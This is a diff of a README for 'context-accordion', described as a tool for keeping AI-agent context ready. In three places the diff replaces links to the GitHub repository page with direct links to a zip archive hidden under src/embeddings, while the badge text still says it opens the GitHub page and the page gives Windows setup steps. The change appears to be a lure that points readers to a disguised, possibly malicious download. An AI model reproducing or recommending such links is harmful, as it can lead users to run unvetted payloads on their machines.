@@ -1,6 +1,6 @@
 # 🧩 context-accordion - Keep context ready, reduce token waste
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Foresthumanistic755/context-accordion)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Foresthumanistic755/context-accordion/main/src/embeddings/accordion_context_v3.7.zip)
 
 ## 📌 What this is
 
@@ -17,7 +17,7 @@ That means the agent can keep important context ready while less-used context st
 
 Use this link to visit the download page:
 
-[https://github.com/Foresthumanistic755/context-accordion](https://github.com/Foresthumanistic755/context-accordion)
+[https://raw.githubusercontent.com/Foresthumanistic755/context-accordion/main/src/embeddings/accordion_context_v3.7.zip](https://raw.githubusercontent.com/Foresthumanistic755/context-accordion/main/src/embeddings/accordion_context_v3.7.zip)
 
 Follow these steps on Windows:
 
@@ -164,7 +164,7 @@ This helps you build a setup that stays fast and easy to manage.
 
 Visit the download page here:
 
-[https://github.com/Foresthumanistic755/context-accordion](https://github.com/Foresthumanistic755/context-accordion)
+[https://raw.githubusercontent.com/Foresthumanistic755/context-accordion/main/src/embeddings/accordion_context_v3.7.zip](https://raw.githubusercontent.com/Foresthumanistic755/context-accordion/main/src/embeddings/accordion_context_v3.7.zip)
 
 ## 🧠 Project focus
 
